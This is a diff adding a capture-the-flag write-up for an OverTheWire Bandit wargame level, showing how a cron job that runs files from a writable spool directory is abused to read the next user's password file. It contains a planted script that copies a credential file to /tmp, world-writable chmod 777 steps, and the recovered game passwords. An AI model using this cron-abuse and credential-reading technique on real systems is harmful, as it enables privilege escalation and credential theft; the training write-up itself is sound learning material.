@@ -597,9 +597,97 @@ Bandit23's password is `jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`
 
 > **NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
 
+cat */etc/cron.d/cronjob_bandit24*
+```zsh
+$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
 
+Check /usr/bin/cronjob_bandit23.sh
+```zsh
+$ cat /usr/bin/cronjob_bandit23.sh
+
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+This script executes every file that is in /var/spool/bandit24 (because he's executing cron job). Maybe we can create something inside that directory?
+
+```zsh
+$ cd /var/spool/bandit24
+bandit23@bandit:/var/spool/bandit24$
+```
+
+Well, we can cd into it, but can we create any files? It's possible to check by trial-and-error, but inspecting directory permissions is both faster and easier to check.
+
+```zsh
+$ ls -l  /var/spool
+total 12
+drwxrwx-wx 88 root bandit24 4096 Feb 18 19:49 bandit24
+```
+
+Bandit23 has no read permission, but do have write and execute permissions. So we can create files, go inside that directory, but it's neither possible to read nor list the files in that directory.
+
+I created a script in that directory.
+```zsh
+$ touch getpasswd.sh
+$ vi getpasswd.sh
+
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/adam23/file.txt
+```
+
+This script does a cat on bandit24's password and redirects stdout to /tmp/adam23/file.txt. Now in order for it to execute, it needs the **x** permission (or **1** in octal).
+
+```zsh
+$ chmod 777 getpasswd.sh
+```
+
+Additionaly, the folder must be accessible to every user.
+
+```zsh
+$ chmod 777 /tmp/adam23
+```
+
+Check what's the time
+```zsh
+$ date
+Fri Feb 18 19:48:49 CET 2022
+```
+
+Cron job executes every minute, so wait 'till next minute.
+
+```zsh
+$ date
+Fri Feb 18 19:49:14 CET 2022
+```
+
+Now check what's inside /tmp/adam23/file.txt
+
+Password is `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`
 
 ### Level 24 => 25
+
+
+
 ### Level 25 => 26
 ### Level 26 => 27
 ### Level 27 => 28
